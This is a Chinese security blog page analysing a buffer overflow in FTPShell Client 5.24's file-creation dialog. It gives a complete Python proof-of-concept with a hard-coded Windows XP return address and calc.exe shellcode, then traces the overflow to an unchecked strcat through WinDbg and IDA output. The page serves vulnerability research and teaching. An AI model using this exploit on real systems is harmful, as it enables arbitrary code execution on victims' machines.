<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="initial-scale=1.0,user-scalable=no,maximum-scale=1,width=device-width">
    <title>FTPSHELL CLIENT 5.24本地文件创建功能缓冲区溢出漏洞 | MottoIN</title>
    <link rel='dns-prefetch' href='//www.mottoin.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="MottoIN &raquo; FTPSHELL CLIENT 5.24本地文件创建功能缓冲区溢出漏洞评论Feed" href="http://www.mottoin.com/101175.html/feed" />
<link rel='stylesheet' id='stylesheet-css'  href='http://www.mottoin.com/wp-content/themes/JustNews/css/style.css?ver=2.3.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpcom-qa-css'  href='http://www.mottoin.com/wp-content/plugins/wpcom-qa/css/style.css?ver=1.0' type='text/css' media='all' />
<style id='wpcom-qa-inline-css' type='text/css'>

        .q-content .topic-tab,.q-content .q-answer .as-user,.q-content .q-answer .as-comment-name{color: #1471CA;}
        .q-content .q-topic-wrap a:hover,.q-content .q-answer .as-action a:hover,.q-content .topic-tab:hover{color:#0D62B3;}
        .q-content .put-top,.q-content .topic-tab.current-tab,.q-content .q-answer .as-submit .btn-submit,.q-content .q-answer .as-comments-submit,.q-content .q-add-header .btn-post,.q-content .q-pagination .current{background-color:#1471CA;}
        .q-content .q-answer .as-submit .btn-submit:hover,.q-content .q-answer .as-comments-submit:hover,.q-content .q-add-header .btn-post:hover,.q-content .topic-tab.current-tab:hover,.q-content .q-pagination a:hover{background-color:#0D62B3;}
        .q-content .q-answer .as-comments-input:focus{border-color: #1471CA;}
        
</style>
<link rel='stylesheet' id='um_minified-css'  href='http://www.mottoin.com/wp-content/plugins/ultimate-member/assets/css/um.min.css?ver=10.3.88' type='text/css' media='all' />
<script type='text/javascript' src='http://www.mottoin.com/wp-content/themes/JustNews/js/jquery.min.js?ver=1.12.4'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.mottoin.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.mottoin.com/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='SSL &#038; TLS 安全测试' href='http://www.mottoin.com/101154.html' />
<link rel='next' title='每周安全资讯（2017.04.17—2017.04.23）' href='http://www.mottoin.com/101178.html' />
<link rel='shortlink' href='http://www.mottoin.com/?p=101175' />
<!--  WPCOM主题相关信息开始 -->
<meta name="applicable-device" content="pc,mobile">
<meta http-equiv="Cache-Control" content="no-transform">
<meta name="keywords" content="FTPSHELL,漏洞,漏洞分析,缓冲区溢出">
<meta name="description" content="漏洞说明软件下载：https://www.exploit-db.com/apps/35f21b909eaeb43b12869f595e3b6ca6-ftpsetup.exePoC:#!/usr/bin/pythonfilename=&quot;buffer.txt&quot;#JunkAjunk=&quot;A&quot;*452#77FAB277JMPESP#WindowsXpProfessionalVersion2002Servic">
<!--  WPCOM主题相关信息结束 -->
 
		<script type="text/javascript">

		var ultimatemember_image_upload_url = 'http://www.mottoin.com/wp-content/plugins/ultimate-member/core/lib/upload/um-image-upload.php';
		var ultimatemember_file_upload_url = 'http://www.mottoin.com/wp-content/plugins/ultimate-member/core/lib/upload/um-file-upload.php';
		var ultimatemember_ajax_url = 'http://www.mottoin.com/wp-admin/admin-ajax.php';

		</script>

	
		<style type="text/css">.request_name { display: none !important; }</style>

	<link rel="icon" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-32x32.jpg" sizes="32x32" />
<link rel="icon" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-192x192.jpg" sizes="192x192" />
<link rel="apple-touch-icon-precomposed" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-180x180.jpg" />
<meta name="msapplication-TileImage" content="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-270x270.jpg" />
    <style>
                a,.sec-panel-head span,.list.tabs .tab.active a,.header .nav>li.active>a,.header .dropdown-menu>.active>a,.entry .entry-info .nickname,.entry-bar-inner .author-title,.entry-action .btn-zan,.entry-action .btn-dashang,.comment-body .nickname,.form-submit-text span,.widget_profile .author-title,.um .um-profile-body .um-item-meta a,.login-modal-body .btn-register{color: #08c;}
        .header .dropdown-menu>li>a:hover,.header .dropdown-menu>.active>a:hover,.header .dropdown-menu>.active>a:focus,.navbar-action .publish,.pagination .current,.flex-control-paging li a.flex-active,.form-submit .submit,.sidebar .widget_nav_menu ul li.current-menu-item a,.sidebar .widget_nav_menu ul li.current-post-parent a,.search-form input.submit,.action .contact-title,.pf-submit,.tagHandler ul.tagHandlerContainer li.tagItem,.login-modal-body .btn-login,.woocommerce a.button,.woocommerce button.button,.woocommerce input.button,.woocommerce a.button.alt,.woocommerce button.button.alt,.woocommerce input.button.alt,.woocommerce a.button.alt.disabled,.woocommerce a.button.alt.disabled:hover,.woocommerce a.button.alt:disabled,.woocommerce a.button.alt:disabled:hover,.woocommerce a.button.alt:disabled[disabled],.woocommerce a.button.alt:disabled[disabled]:hover,.woocommerce button.button.alt.disabled,.woocommerce button.button.alt.disabled:hover,.woocommerce button.button.alt:disabled,.woocommerce button.button.alt:disabled:hover,.woocommerce button.button.alt:disabled[disabled],.woocommerce button.button.alt:disabled[disabled]:hover,.woocommerce input.button.alt.disabled,.woocommerce input.button.alt.disabled:hover,.woocommerce input.button.alt:disabled,.woocommerce input.button.alt:disabled:hover,.woocommerce input.button.alt:disabled[disabled],.woocommerce input.button.alt:disabled[disabled]:hover,.woocommerce .widget_price_filter .ui-slider .ui-slider-handle,.woocommerce .widget_price_filter .ui-slider .ui-slider-range,.shopping-count,.social-login-form .sl-input-submit{background-color: #08c;}
        .entry .entry-content h3,.entry .entry-content .h3,.widget-title{border-left-color: #08c;}
        .entry-bar-inner .author-title,.entry-action .btn-zan,.entry-action .btn-dashang,.search-form input.keyword:focus,.widget_profile .author-title,.login-modal-body .btn-login,.login-modal-body .btn-register{border-color: #08c;}
        .entry-bar-inner .author-title:before,.widget_profile .author-title:before{border-right-color: #08c;}
        .list.tabs .tab.active a{border-bottom-color: #08c;}

        a:hover,.header .nav>li>a:hover,.header .nav>li.active>a,.navbar-action .login:hover,.navbar-action .login:focus,.navbar-action .profile a:hover,.navbar-search-icon:hover,.navbar-search-icon:focus,.entry .entry-info a:hover,.entry .entry-info a:focus,.entry-bar .info-item a:hover,.p-item-wrap:hover .title a,.special-item-title a:hover,.special-item-bottom a:hover,.widget ul a:hover,.widget ol a:hover,.sec-panel-head .more:hover,.topic-list .topic-wrap:hover span,.tabs .tab a:hover,
        .article-list .item-title a:hover,.article-list .item-meta a:hover,.article-list .item-meta a:focus,.list-links a:hover,.list-links a:focus,.um .um-profile-body .um-item-meta a:hover,.um .um-profile-body .um-item-link a:hover,.load-more:hover,.login-modal-body .btn-register:hover{color: #07c;}
        .navbar-action .publish:hover,.navbar-action .publish:focus,.entry-tag a:hover,.entry-tag a:focus,.entry-action .btn-zan:hover,.entry-action .btn-dashang:hover,.entry-action .btn-zan.liked,.pagination a:hover,.flex-control-paging li a:hover,.form-submit .submit:hover,.widget .tagcloud a:hover,.sidebar .widget_nav_menu ul li.current-menu-item .sub-menu a:hover,.sidebar .widget_nav_menu ul li.current-post-parent .sub-menu a:hover,.sidebar .widget_nav_menu ul li a:hover,.search-form input.submit:hover,.action .a-box:hover,.footer-sns .fa:after,.article-list .item-category:hover,.pf-submit:hover,.tagHandler ul.tagHandlerContainer li.tagItem:hover,.login-modal-body .btn-login:hover,.woocommerce a.button:hover,.woocommerce button.button:hover,.woocommerce input.button:hover,.woocommerce a.button.alt:hover,.woocommerce button.button.alt:hover,.woocommerce input.button.alt:hover,.woocommerce .widget_price_filter .price_slider_wrapper .ui-widget-content,.social-login-form .sl-input-submit:hover{background-color: #07c;}
        .entry-tag a:hover,.entry-tag a:focus,.entry-action .btn-zan:hover,.entry-action .btn-dashang:hover,.entry-action .btn-zan.liked,.widget .tagcloud a:hover,.load-more:hover,.login-modal-body .btn-login:hover,.login-modal-body .btn-register:hover{border-color: #07c;}
        .special-item-bottom a:hover:before{border-left-color: #07c;}
        .list.tabs .tab.active a:hover{border-bottom-color: #07c;}
        @media (max-width: 991px){
            .header .navbar-nav>li.active>a,.header .navbar-nav .dropdown-menu .active a,.header .navbar-nav .dropdown-menu .active .dropdown-menu .active a{color: #08c;}
            .navbar-collapse{background-color: #08c;}
            .dropdown-menu>li a{border-color: #07c;}
            .header .navbar-nav>li.active>a:hover,.header .navbar-nav>li a:hover,.header .navbar-nav .dropdown-menu .active a:hover,.header .navbar-nav .dropdown-menu .active .dropdown-menu a:hover,.header .navbar-nav .dropdown-menu li a:hover{color: #07c;}
        }
        .j-share{position: fixed!important;top: 50%!important;}
                .header .logo img{max-height: 32px;}
                @media (max-width: 767px){
            .header .logo img{max-height: 26px;}
        }
                        .btn-post{
    display: block;
    margin: 0 auto;
    padding: 15px 20px;
    font-size: 16px;
    text-align: center;
    color: #fff !important;
    line-height: 1;
    background: #1471CA;
    -webkit-border-radius: 3px;
    border-radius: 3px;
    text-decoration: none;
    border: 0;
    outline: 0;
}    </style>
    <script> (function() {if (!/*@cc_on!@*/0) return;var e = "abbr, article, aside, audio, canvas, datalist, details, dialog, eventsource, figure, footer, header, hgroup, mark, menu, meter, nav, output, progress, section, time, video".split(', ');var i= e.length; while (i--){ document.createElement(e[i]) } })()</script>
    <!--[if lte IE 8]><script src="http://www.mottoin.com/wp-content/themes/JustNews/js/respond.min.js"></script><![endif]-->
</head>
<body class="post-template-default single single-post postid-101175 single-format-standard">
<header class="header">
    <div class="container clearfix">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">
                <span class="icon-bar icon-bar-1"></span>
                <span class="icon-bar icon-bar-2"></span>
                <span class="icon-bar icon-bar-3"></span>
            </button>
            <a class="logo" href="http://www.mottoin.com"><img src="http://www.mottoin.com/img/mottoin/logo.png" alt="MottoIN"></a>
        </div>
        <div class="collapse navbar-collapse">
            <nav class="navbar-left primary-menu"><ul id="menu-%e5%af%bc%e8%88%aa" class="nav navbar-nav"><li class="menu-item menu-item-home"><a href="http://www.mottoin.com/">首页</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/category/news">资讯</a></li>
<li class="menu-item current-post-ancestor dropdown"><a href="http://www.mottoin.com/category/article" class="dropdown-toggle">文章</a>
<ul role="menu" class=" dropdown-menu">
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/web">Web安全</a></li>
	<li class="menu-item current-post-ancestor"><a href="http://www.mottoin.com/category/article/system">系统安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/network">网络安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/terminal">终端安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/database">数据安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/wireless">无线安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/social">社会工程</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/intranet">内网渗透</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/code">代码审计</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/reverse">逆向破解</a></li>
</ul>
</li>
<li class="menu-item"><a href="http://www.mottoin.com/category/tools">工具</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/category/geek">极客</a></li>
<li class="menu-item dropdown"><a href="http://www.mottoin.com/category/sole" class="dropdown-toggle">独家</a>
<ul role="menu" class=" dropdown-menu">
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/topic">专题</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/people">人物</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/view">观点</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/events">活动</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/video">视频</a></li>
</ul>
</li>
<li class="menu-item"><a href="http://www.mottoin.com/category/hr">招聘</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/forum">社区</a></li>
</ul></nav>            <div class="navbar-action pull-right">

                                    <form class="navbar-search" action="http://www.mottoin.com" method="get" role="search">
                        <input type="text" name="s" class="navbar-search-input" autocomplete="off" placeholder="输入关键词搜索..." value="">
                        <a class="navbar-search-icon j-navbar-search" href="javascript:;"></a>
                    </form>

                    
                    <div id="j-user-wrap">
                        <a class="login" href="http://www.mottoin.com/login">登录</a>
                        <a class="login" href="http://www.mottoin.com/register">注册</a>
                    </div>
                    <a class="publish" href="http://www.mottoin.com/post">
                        投稿</a>
                                                </div>
        </div><!-- /.navbar-collapse -->
    </div><!-- /.container -->
</header>
<div id="wrap">    <div class="main container">
        <div class="content">
                            <article id="post-101175" class="post-101175 post type-post status-publish format-standard has-post-thumbnail hentry category--system tag-ftpshell tag-41 tag-425 tag-818">
                    <div class="entry">
                        <div class="entry-head">
                            <h1 class="entry-title">FTPSHELL CLIENT 5.24本地文件创建功能缓冲区溢出漏洞</h1>
                            <div class="entry-info">
                                                                <a class="nickname" href="http://www.mottoin.com/user/hypnos/">Jarry</a>
                                <span class="dot">•</span>
                                <span>2017年4月23日</span>
                                <span class="dot">•</span>
                                <a href="http://www.mottoin.com/category/article/system/%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-system" rel="category tag">漏洞分析</a>                                                                    <span class="dot">•</span>
                                    <span>阅读 393</span>
                                                            </div>
                        </div>
                                                                        <div class="entry-content clearfix">
                            <h2 class="md-end-block md-heading md-focus"><span class="md-expand">漏洞说明</span></h2>
<p><span class="md-line md-end-block">软件下载：</span></p>
<p><span class="md-line md-end-block"><span spellcheck="false"><a href="https://www.exploit-db.com/apps/35f21b909eaeb43b12869f595e3b6ca6-ftpsetup.exe">https://www.exploit-db.com/apps/35f21b909eaeb43b12869f595e3b6ca6-ftpsetup.exe</a></span></span></p>
<p><span class="md-line md-end-block">PoC:</span></p>
<pre class="md-fences md-end-block" lang="" contenteditable="false">#!/usr/bin/python
filename = "buffer.txt"
# Junk A
junk = "A"*452
#77FAB277  JMP ESP
# Windows Xp Professional Version 2002 Service Pack 3
eip = "\x77\xB2\xFA\x77"
# Nops
nops = "\x90"*100
# Shellcode Calc.exe 16Byte
buf=("\x31\xC9"
"\x51"    
"\x68\x63\x61\x6C\x63"    
"\x54"    
"\xB8\xC7\x93\xC2\x77"    
"\xFF\xD0")

#Appending Buffers Together
exploit = junk + eip + nops + buf
#Creating File
length = len(exploit)
print "[+]File name:     [%s]\n" % filename
print "[+]Payload Size: [%s]\n " % length 
print "[+]File Created.\n" 
file = open(filename,"w")
file.write(exploit)
file.close
print exploit</pre>
<p class=""><span class="md-line md-end-block"><span class="">这是在FTPShell的一个本地代码执行漏洞，利用PoC会生成一个buffer.txt，用UE打开，复制buffer.txt里的文本，之后打开FTPShell，在菜单中选文件，然后创建文件，会弹出一个对话框，在对话框里粘贴复制的文本，确定后漏洞触发，这里可以将buffer.txt中畸形数据的内容改成&#8221;A&#8221;*600，可以比较稳定触发漏洞。</span></span></p>
<h2 class="md-end-block md-heading"><span class="">漏洞复现</span></h2>
<p><span class="md-line md-end-block">此漏洞是由于FTPShell中的sub<span class=""><em>42D23C函数，在调用strcat时会进行一次字符串拼接组成一个完整路径，在进行字符串拼接前后，没有对文件名进行合法性检查，导致拼接完成后，在后续的sub</em></span><span class="">464A20函数调用后，会在函数内部进行一次字符串赋值，因为没有检查长度，因此在赋值后会导致缓冲区被覆盖，返回地址被覆盖从而使返回地址可控，可接管程序流程，下面对此漏洞进行详细分析。</span></span></p>
<p><span class="md-line md-end-block">首先触发漏洞，附加windbg，到达崩溃现场</span></p>
<pre class="md-fences md-end-block" lang="" contenteditable="false">0:000&gt; g
(3b0.390): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=00df4cd0 ecx=00000392 edx=00000392 esi=00dc36c8 edi=0012fa78
eip=41414141 esp=0012fa3c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210246
41414141 ??              ???</pre>
<p><span class="md-line md-end-block">通过kb查看堆栈调用</span></p>
<pre class="md-fences md-end-block" lang="" contenteditable="false">0:000&gt; kb
ChildEBP RetAddr  Args to Child              
WARNING: Frame IP not in any known module. Following frames may be wrong.
0012fa38 41414141 41414141 41414141 41414141 0x41414141
0012fa3c 41414141 41414141 41414141 41414141 0x41414141
0012fa40 41414141 41414141 41414141 41414141 0x41414141
0012fa44 41414141 41414141 41414141 41414141 0x41414141
0012fa48 41414141 41414141 41414141 41414141 0x41414141
0012fa4c 41414141 41414141 41414141 41414141 0x41414141
0012fa50 41414141 41414141 41414141 41414141 0x41414141
0012fa54 41414141 41414141 41414141 41414141 0x41414141
0012fa58 41414141 41414141 41414141 41414141 0x41414141
0012fa5c 41414141 41414141 41414141 41414141 0x41414141</pre>
<p><span class="md-line md-end-block">可以看到此时堆栈已经被冲垮了，我们可以缩短畸形字符串长度来减少栈被冲垮的部分，从而对之前的函数调用进行回溯，减少畸形字符串长度之后，重新打开程序，再次崩溃。</span></p>
<pre class="md-fences md-end-block" lang="" contenteditable="false">0:008&gt; g
(1ac.4b8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=00df5518 ecx=0012fa4c edx=00000314 esi=00dc36c8 edi=0012fa78
eip=0042d415 esp=0012fa40 ebp=00004141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210202
*** WARNING: Unable to verify checksum for C:\Program Files\FTPShell\ftpshell.exe
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\FTPShell\ftpshell.exe - 
ftpshell!Tb2extitemsinitialization$qqrv+0x18c51:
0042d415 8b55cc          mov     edx,dword ptr [ebp-34h] ss:0023:0000410d=????????</pre>
<p><span class="md-line md-end-block">注意观察此时ebp的值是00004141，其实这里应该是漏洞触发函数之后，应该是在此层函数调用中，有一个内层函数的调用，而就是在那个函数调用的位置发生了缓冲区溢出，导致返回外层函数，也就是现在这个漏洞崩溃现场的ret指令时，由于返回地址被覆盖，从而导致了溢出。</span></p>
<p class=""><span class="md-line md-end-block">因此，我们可以从0042d415这个地址所在的函数中寻找漏洞触发点。</span></p>
<h2 class="md-end-block md-heading">漏洞分析</h2>
<p><span class="md-line md-end-block">通过IDA Pro回溯此层函数sub<span class=""><em>42D23C，找到了一个执行区间，loc</em></span>42D35A，离漏洞触发位置不远，实际上，这个寻找过程需要从sub_42D23C入口处下断点，不断调整找到的，这里我省略了重复的过程。</span></p>
<pre class="md-fences md-end-block" lang="" contenteditable="false">.text:0042D35A loc_42D35A:                             ; CODE XREF: sub_42D23C+10D<span class="cm-invalidchar" title="\u18">•</span>j
.text:0042D35A                 mov     eax, [esi]
.text:0042D35C                 push    esi
.text:0042D35D                 add     eax, 150h
.text:0042D362                 lea     esi, [ebp+dest]
.text:0042D368                 mov     edi, eax
.text:0042D36A                 xor     eax, eax
.text:0042D36C                 or      ecx, 0FFFFFFFFh
.text:0042D36F                 repne scasb
.text:0042D371                 not     ecx
.text:0042D373                 sub     edi, ecx</pre>
<p><span class="md-line md-end-block">接下来，我们在0042D35A下断点，重新触发漏洞，命中断点后跟踪。</span></p>
<pre class="md-fences md-end-block" lang="" contenteditable="false">0:008&gt; bp 0042D35A
*** WARNING: Unable to verify checksum for C:\Program Files\FTPShell\ftpshell.exe
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\FTPShell\ftpshell.exe - 
0:008&gt; g
Breakpoint 0 hit
eax=00000000 ebx=00df54e0 ecx=00000000 edx=0075bbc0 esi=00dc36c8 edi=00df54e0
eip=0042d35a esp=0012fa40 ebp=0012fd94 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206
ftpshell!Tb2extitemsinitialization$qqrv+0x18b96:
0042d35a 8b06            mov     eax,dword ptr [esi]  ds:0023:00dc36c8=00e1aee4</pre>
<p><span class="md-line md-end-block">可以看到在入口处，并没有涉及到漏洞的畸形字符串的赋值和漏洞触发的原因，我们需要准确分析为什么会产生漏洞和产生漏洞的位置。接下来我们单步跟踪。</span></p>
<pre class="md-fences md-end-block" lang="" contenteditable="false">0:000&gt; t
eax=00000000 ebx=00df54e0 ecx=fffffffa edx=0075bbc0 esi=0012fa4c edi=00e1b039
eip=0042d36f esp=0012fa3c ebp=0012fd94 iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210286
ftpshell!Tb2extitemsinitialization$qqrv+0x18bab:
0042d36f f2ae            repne scas byte ptr es:[edi]
0:000&gt; dc edi
00e1b039  656d7563 2073746e 20646e61 74746553  cuments and Sett
00e1b049  73676e69 6f6f725c 794d5c74 636f4420  ings\root\My Doc
00e1b059  6e656d75 00007374 00000000 00000000  uments.</pre>
<p><span class="md-line md-end-block">可以看到此处有一处循环赋值操作，可以看到edi中存放的值是一个绝对路径，前面C：\D之所以没有是因为我执行了两次，导致前面的值已经被赋值了，那么接下来继续单步跟踪。</span></p>
<pre class="md-fences md-end-block" lang="" contenteditable="false">0:000&gt; t
eax=0012fa4c ebx=00df54c8 ecx=0012fbd4 edx=00000002 esi=00dc36c8 edi=0012fa78
eip=0042d3b7 esp=0012fa38 ebp=0012fd94 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200212
ftpshell!Tb2extitemsinitialization$qqrv+0x18bf3:
0042d3b7 e8e0512400      call    ftpshell!Tbskinplusinitialization$qqrv+0x6e688 (0067259c)
0:000&gt; t
eax=0012fa4c ebx=00df54c8 ecx=0012fbd4 edx=00000002 esi=00dc36c8 edi=0012fa78
eip=0067259c esp=0012fa34 ebp=0012fd94 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200212
ftpshell!Tbskinplusinitialization$qqrv+0x6e688:
0067259c 55              push    ebp
0:000&gt; gu
eax=0012fa4c ebx=00df54c8 ecx=00000000 edx=00000169 esi=00dc36c8 edi=0012fa78
eip=0042d3bc esp=0012fa38 ebp=0012fd94 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202
ftpshell!Tb2extitemsinitialization$qqrv+0x18bf8:
0042d3bc 83c408          add     esp,8
0:000&gt; dd eax
0012fa4c  445c3a43 6d75636f 73746e65 646e6120
0012fa5c  74655320 676e6974 6f725c73 4d5c746f
0012fa6c  6f442079 656d7563 5c73746e 41414141
0012fa7c  41414141 41414141 41414141 41414141
0012fa8c  41414141 41414141 41414141 41414141
0012fa9c  41414141 41414141 41414141 41414141
0012faac  41414141 41414141 41414141 41414141
0012fabc  41414141 41414141 41414141 41414141</pre>
<p><span class="md-line md-end-block">可以看到，当0042d3b7处的call函数调用后，我们观察eax的值已经变成了畸形字符串，那么初步判定，0042d3b7处的call函数是产生畸形字符串的原因，接下来继续单步跟踪。</span></p>
<pre class="md-fences md-end-block" lang="" contenteditable="false">0:000&gt; t
eax=0012fa4c ebx=00df54e0 ecx=00000000 edx=0012fa4c esi=00dc36c8 edi=0012fa78
eip=0042d3c5 esp=0012fa40 ebp=0012fd94 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200212
ftpshell!Tb2extitemsinitialization$qqrv+0x18c01:
0042d3c5 52              push    edx
0:000&gt; t
eax=0012fa4c ebx=00df54e0 ecx=00000000 edx=0012fa4c esi=00dc36c8 edi=0012fa78
eip=0042d3c6 esp=0012fa3c ebp=0012fd94 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200212
ftpshell!Tb2extitemsinitialization$qqrv+0x18c02:
0042d3c6 e855760300      call    ftpshell!Rcgui_mainFinalize+0x22d50 (00464a20)
0:000&gt; t
eax=0012fa4c ebx=00df54e0 ecx=00000000 edx=0012fa4c esi=00dc36c8 edi=0012fa78
eip=00464a20 esp=0012fa38 ebp=0012fd94 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200212
ftpshell!Rcgui_mainFinalize+0x22d50:
00464a20 55              push    ebp
0:000&gt; gu
eax=00000001 ebx=00df54e0 ecx=00000314 edx=00000314 esi=00dc36c8 edi=0012fa78
eip=0042d3cb esp=0012fa3c ebp=00004141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246
ftpshell!Tb2extitemsinitialization$qqrv+0x18c07:
0042d3cb 59              pop     ecx
0:000&gt; kb
ChildEBP RetAddr  Args to Child              
WARNING: Stack unwind information not available. Following frames may be wrong.
0012fa38 0012fa4c 0012fe50 00cc0dc0 00dbaad0 ftpshell!Tb2extitemsinitialization$qqrv+0x18c07
0012fa3c 0012fe50 00cc0dc0 00dbaad0 445c3a43 0x12fa4c
0012fa4c 6d75636f 73746e65 646e6120 74655320 0x12fe50
0012fa50 73746e65 646e6120 74655320 676e6974 0x6d75636f
0012fa54 646e6120 74655320 676e6974 6f725c73 0x73746e65
0012fa58 74655320 676e6974 6f725c73 4d5c746f 0x646e6120
0012fa5c 676e6974 6f725c73 4d5c746f 6f442079 0x74655320
0012fa60 6f725c73 4d5c746f 6f442079 656d7563 0x676e6974
0012fa64 4d5c746f 6f442079 656d7563 5c73746e 0x6f725c73
0012fa68 6f442079 656d7563 5c73746e 41414141 0x4d5c746f
0012fa6c 656d7563 5c73746e 41414141 41414141 0x6f442079
0012fa70 5c73746e 41414141 41414141 41414141 0x656d7563
0012fa74 41414141 41414141 41414141 41414141 0x5c73746e
0012fa78 41414141 41414141 41414141 41414141 0x41414141
0012fa7c 41414141 41414141 41414141 41414141 0x41414141
0012fa80 41414141 41414141 41414141 41414141 0x41414141
0012fa84 41414141 41414141 41414141 41414141 0x41414141
0012fa88 41414141 41414141 41414141 41414141 0x41414141</pre>
<p><span class="md-line md-end-block">可以看到0042d3c6处的call函数调用结束后，ebp的值变成了00004141，那么实际上这里的call函数很有可能就是覆盖返回地址的函数，只是这里由于我减少了畸形字符串的长度，从而导致没有覆盖返回地址，正常情况下，通过这里的返回地址覆盖，就可以执行任意代码了，那么接下来我们就来看一下这两处关键的call调用。</span></p>
<p><span class="md-line md-end-block">在重启程序之前，我们需要加长畸形字符串长度，这样能确保在漏洞触发现场覆盖返回地址，接下来我们来到第一处call函数中断，来看一下这处call函数调用。</span></p>
<pre class="md-fences md-end-block" lang="" contenteditable="false">.text:0067259C ; Attributes: library function bp-based frame
.text:0067259C
.text:0067259C ; char *__cdecl strcat(char *dest, const char *src)
.text:0067259C _strcat         proc near               ; CODE XREF: sub_4151E8+915<span class="cm-invalidchar" title="\u18">•</span>p
.text:0067259C                                         ; sub_4151E8+926<span class="cm-invalidchar" title="\u18">•</span>p ...
.text:0067259C
.text:0067259C dest            = dword ptr  8
.text:0067259C src             = dword ptr  0Ch
.text:0067259C
.text:0067259C                 push    ebp
.text:0067259D                 mov     ebp, esp
.text:0067259F                 push    esi
.text:006725A0                 push    edi
.text:006725A1                 mov     edi, [ebp+dest]
.text:006725A4                 mov     ecx, 0FFFFFFFFh
.text:006725A9                 xor     al, al
.text:006725AB                 cld
.text:006725AC                 repne scasb
.text:006725AE                 lea     esi, [edi-1]
.text:006725B1                 mov     edi, [ebp+src]
.text:006725B4                 mov     ecx, 0FFFFFFFFh
.text:006725B9                 repne scasb
.text:006725BB                 not     ecx
.text:006725BD                 sub     edi, ecx
.text:006725BF                 xchg    esi, edi
.text:006725C1                 mov     edx, ecx
.text:006725C3                 shr     ecx, 1
.text:006725C5                 shr     ecx, 1
.text:006725C7                 cld
.text:006725C8                 rep movsd
.text:006725CA                 mov     ecx, edx
.text:006725CC                 and     ecx, 3
.text:006725CF                 rep movsb
.text:006725D1                 mov     eax, [ebp+dest]
.text:006725D4                 pop     edi
.text:006725D5                 pop     esi
.text:006725D6                 pop     ebp</pre>
<p><span class="md-line md-end-block">可以看到这处call函数调用实际是自己写的一个strcat函数，也就是字符串拼接，它会将src拼接到dest字符串后面，这样的话我们在函数调用处看一下两个地址保存的内容。</span></p>
<pre class="md-fences md-end-block" lang="" contenteditable="false">0:008&gt; g
Breakpoint 0 hit
eax=0012fa4c ebx=00df5044 ecx=0012fbd4 edx=00000002 esi=00dc36c8 edi=0012fa78
eip=0042d3b7 esp=0012fa38 ebp=0012fd94 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200212
ftpshell!Tb2extitemsinitialization$qqrv+0x18bf3:
0042d3b7 e8e0512400      call    ftpshell!Tbskinplusinitialization$qqrv+0x6e688 (0067259c)
0:000&gt; dd esp
0012fa38  0012fa4c 0012fbd4 0012fe50 00cc0dc0
0012fa48  00dbaad0 445c3a43 6d75636f 73746e65
0012fa58  646e6120 74655320 676e6974 6f725c73
0012fa68  4d5c746f 6f442079 656d7563 5c73746e
0012fa78  00010000 00000005 0012f9dc 80000000
0012fa88  0012fc00 7c92e900 7c930040 ffffffff
0012fa98  7c93003d 77d2e65c 00140000 00000000
